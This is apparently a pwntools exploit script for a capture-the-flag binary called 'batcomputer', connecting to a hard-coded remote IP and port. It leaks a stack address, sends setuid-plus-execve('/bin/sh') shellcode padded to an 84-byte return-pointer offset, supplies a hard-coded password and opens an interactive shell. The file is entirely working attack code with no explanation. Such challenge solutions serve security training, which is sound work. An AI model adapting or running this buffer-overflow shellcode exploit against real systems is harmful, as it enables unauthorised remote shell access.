#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './batcomputer', checksec=False)

host = args.HOST or '94.237.60.129'
port = int(args.PORT or 47854)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
rp_offset = 84

shellcode = b""
shellcode += b"\x48\xc7\xc0\x69\x00\x00\x00"        # mov rax, 0x69
shellcode += b"\x48\xc7\xc7\x00\x00\x00\x00"        # mov rdi, 0x0
shellcode += b"\x0f\x05"                            # syscall
shellcode += b"\x48\xbb\x2f\x62\x69\x6e\x2f"        # movabs rbx, 0x68732f6e69622f
shellcode += b"\x73\x68\x00"
shellcode += b"\x53"                                # push rbx
shellcode += b"\x48\x89\xe7"                        # mov rdi, rsp
shellcode += b"\x48\xc7\xc0\x3b\x00\x00\x00"        # mov rax, 0x3b
shellcode += b"\x48\xc7\xc6\x00\x00\x00\x00"        # mov rsi, 0x0
shellcode += b"\x48\xc7\xc2\x00\x00\x00\x00"        # mov rdx, 0x0
shellcode += b"\x0f\x05"                            # syscall

io = start()

# Leak stack address
io.sendlineafter(b"> ", b"1")
leak = io.recvline()            \
            .decode("utf-8")    \
            .split()[-1]
info(f"Leaked stack address: {leak}")
leak = flat(int(leak, 16))

# Create and send payload 
payload = flat(
    shellcode,
    b"A" * (rp_offset - len(shellcode)),
    leak,
)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the password: ", b"b4tp@$$w0rd!")
io.sendlineafter(b"Enter the navigation commands: ", payload)

# Execute shellcode
io.sendlineafter(b"> ", b"3")
io.interactive()